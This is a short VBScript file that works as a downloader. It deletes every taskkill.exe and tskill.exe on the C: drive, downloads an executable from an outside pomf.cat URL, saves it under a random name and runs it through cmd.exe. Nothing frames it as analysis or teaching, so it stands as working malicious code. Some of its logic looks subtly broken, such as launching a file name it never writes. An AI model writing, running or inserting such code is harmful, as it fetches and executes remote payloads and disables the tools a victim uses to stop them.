Dim max,min
Dim list
Set list = CreateObject("System.Collections.ArrayList")
	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee
	list.Add "http://a.pomf.cat/utoojo.exe"        'installer

names = "C:\eevee.exe"
i = 0
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /C for /r C:\ %i in (taskkill.exe) do del /f/s/q ""%i"" && pause"
oShell.run "cmd.exe /C for /r C:\ %i in (tskill.exe) do del /f/s/q ""%i"" && pause"
Do While i <= 0
	max=999999999
	min=100000000
	Randomize
	strHDLocation = (Int((max-min+1)*Rnd+min))&".exe"
	streevee = (Int((max-min+1)*Rnd+min))&".exe"
	
	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
	objXMLHTTP.open "GET", list(i), false
	If i > 1 Then
	    i = 0
	End if
	objXMLHTTP.send()
	If objXMLHTTP.Status = 200 Then
		Set objADOStream = CreateObject("ADODB.Stream")
	End if

	objADOStream.Open
	objADOStream.Type = 1 

	objADOStream.Write objXMLHTTP.ResponseBody
	objADOStream.Position = 0    
	Set objFSO = Createobject("Scripting.FileSystemObject")
	If Not objFSO.Fileexists(strHDLocation) Then 
		objADOStream.SaveToFile strHDLocation
		objADOStream.Close
		Set objADOStream = Nothing
	End if
	Set objXMLHTTP = Nothing
	

	oShell.run "cmd.exe /C "&streevee&" "&strHDLocation
	Set oShell = Nothing
	i = i + 1
Loop 
